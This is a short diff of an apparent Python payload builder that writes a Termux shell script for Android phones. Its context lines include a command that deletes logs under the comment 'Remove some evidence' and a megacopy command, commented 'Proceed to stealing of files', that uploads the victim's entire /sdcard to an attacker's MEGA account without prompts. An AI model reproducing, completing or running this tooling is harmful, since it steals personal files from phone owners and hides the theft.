@@ -55,7 +55,7 @@ zCh.write(megaputs)
 zCh.write("\necho \"Please install termux api app first\"\nfi\n")
 
 # Remove some evidence
-zCh.write("rm -rf log INFO.txt")
+zCh.write("rm -rf log INFO.txt\n")
 # Proceed to stealing of files
 zCh.write("megacopy --local /sdcard --remote /Root --no-ask-password --disable-previews --no-ask-password -u " + str(email) + " -p " + str(passwd))
 zCh.write("\nclear\n")
